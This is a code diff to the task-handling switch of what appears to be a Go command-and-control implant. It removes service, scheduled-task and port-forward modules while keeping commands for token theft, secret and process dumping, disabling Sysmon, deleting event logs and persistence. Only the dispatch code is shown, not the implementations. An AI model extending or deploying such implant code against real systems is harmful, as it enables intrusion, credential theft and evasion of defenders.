@@ -54,10 +54,7 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/impersonation/stealtoken"
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/admincheck"
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/exectools"
-	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/portforward"
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/scanner"
-	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/scheduledtasks"
-	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/services"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/addusertogroup"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/crontab"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/launchitems"
@@ -273,10 +270,6 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = enableprivilege.ShowPrivileges()
 	case "enum-tokens":
 		result, cmdError = enumtokens.EnumTokens()
-	case "port-forward":
-		result, cmdError = portforward.PortForward(t.Args)
-	case "revert-port-forward":
-		result, cmdError = portforward.RevertPortForward()
 	case "dump-process":
 		result, cmdError = dumpprocess.MiniDumpProcess(t.Args)
 	case "dump-secrets":
@@ -293,26 +286,10 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = admincheck.AdminCheck(t.Args[0])
 	case "disable-sysmon":
 		result, cmdError = patchsysmon.DisableSysmon()
-	case "create-service":
-		result, cmdError = services.CreateService(t.Args)
-	case "delete-service":
-		result, cmdError = services.DeleteService(t.Args)
-	case "start-service":
-		result, cmdError = services.StartService(t.Args)
-	case "stop-service":
-		result, cmdError = services.StopService(t.Args)
 	case "list-ports":
 		result, cmdError = listports.ListPorts()
 	case "delete-event-log":
 		result, cmdError = cleareventlog.DeleteEventLog(t.Args[0])
-	case "scheduled-task":
-		result, cmdError = scheduledtasks.CreateScheduledTask(t.Args)
-	case "create-scheduled-task":
-		result, cmdError = scheduledtasks.CreateScheduledTask(t.Args)
-	case "execute-scheduled-task":
-		result, cmdError = scheduledtasks.ExecuteScheduledTask(t.Args)
-	case "delete-scheduled-task":
-		result, cmdError = scheduledtasks.DeleteScheduledTask(t.Args)
 	case "powershell-profile":
 		result, cmdError = powershellprofile.PowershellProfilePersistence(t.Args[0])
 	case "port-scan":
@@ -326,7 +303,7 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	case "ps-exec":
 		result, cmdError = exectools.PsExec(t.Args)
 	case "fileless-service":
-		result, cmdError = services.FilelessService(t.Args)
+		result, cmdError = exectools.FilelessService(t.Args)
 	case "list-shares":
 		result, cmdError = listshares.ListShares(t.Args)
 	case "shell-history":
@@ -393,8 +370,6 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	case "enum-local":
 		result = enumlocaluser.EnumLocal()
 		cmdError = nil
-	case "modify-service-binary":
-		result, cmdError = services.ModifyServiceBinary(t.Args)
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
